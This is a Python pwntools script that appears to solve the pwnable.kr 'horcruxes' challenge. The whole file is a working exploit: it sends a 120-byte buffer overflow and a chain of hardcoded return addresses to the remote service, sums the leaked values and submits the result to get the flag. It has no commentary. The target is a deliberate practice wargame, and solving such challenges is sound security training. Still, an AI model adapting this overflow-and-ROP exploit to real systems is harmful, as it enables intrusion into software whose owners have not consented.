from pwn import *

io = remote("pwnable.kr", 9032)

io.sendline(b"1")
payload = b"A"*120

# send horcruxes
A = p32(0x809fe4b)
B = p32(0x809fe6a)
C = p32(0x809fe89)
D = p32(0x809fea8)
E = p32(0x809fec7)
F = p32(0x809fee6)
G = p32(0x809ff05)

e = p32(0x809fffc)

payload += A
payload += B
payload += C
payload += D
payload += E
payload += F
payload += G
payload += e

io.sendline(payload)

# send sum and flag it up
io.recvuntil(b":")
io.recvuntil(b":")
bob = io.recvuntil(b":").split(b"\n")
bob = b"(EXP +".join(bob).split(b"(EXP +")

my_sum = 0
for alice in bob:
    try:
        my_sum += int(alice[:-1])
    except:
        pass

io.sendline(b"1")
io.sendline(f"{my_sum}".encode())

flag = io.recvline()
print(flag)

io.interactive()

